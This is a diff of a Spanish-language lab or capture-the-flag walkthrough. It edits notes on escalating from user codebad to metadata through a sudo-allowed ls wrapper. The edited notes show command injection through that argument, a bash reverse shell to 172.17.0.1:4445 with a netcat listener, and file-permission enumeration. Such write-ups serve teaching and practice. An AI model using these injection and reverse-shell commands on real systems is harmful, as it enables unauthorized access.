@@ -85,18 +85,21 @@ despues de un rato probando /home/codebad/code para ver como funcionaba, me di c
 asi que primero revisemos que tiene el usuario metadata en su directorio
 
 sudo -u metadata /home/codebad/code "-l /home/metadata/"
-pass.txt user.txt
+-rwxrwxr-x 1 metadata metadata        33 Aug 29 12:20 user.txt
+-rw------- 1 root     root            15 Aug 29 11:42 pass.txt
 
 solo podemos leer user.txt, no tenemos permisos para el archivo pass.txt
+
+sudo -u metadata /home/codebad/code "-l /home/metadata/user.txt |cat /home/metadata/user.txt"
 f5d22841e337cab01739e59cce3275e9
 
 intente crackearlo pero no lo consegui... asi que vamos a escalar al siguiente usuario
-nos colocamos en escucha con netcat
+nos colocamos en escucha con netcat desde nuestra maquina atacante
 
 nc -lnvp 4445
 
 
-ahora ejecutamos desde codebad
+ahora ejecutamos desde el usuario codebad
 sudo -u metadata /home/codebad/code "-l /home/metadata/user.txt | bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/4445 0>&1' "
 
 y ahora nos vamos a netcat y somos el usuario metadata
@@ -104,9 +107,9 @@ y ahora nos vamos a netcat y somos el usuario metadata
 sudo -l					| solicita passwd
 find / -perm -4000 2>/dev/null		| nada por aqui
 find / -type f -perm -o+x 2>/dev/null
-
+.
+.
 /usr/local/bin/metadatosmalos
-
 
 de todos los resultados este llamo mucho mi atencion, asi que lo chequeo pero no veo nada de interes, aunque por algo esta alli,
 asi que tras probar el nombre del archivo como la clave de el usuario metadata, resulta ser
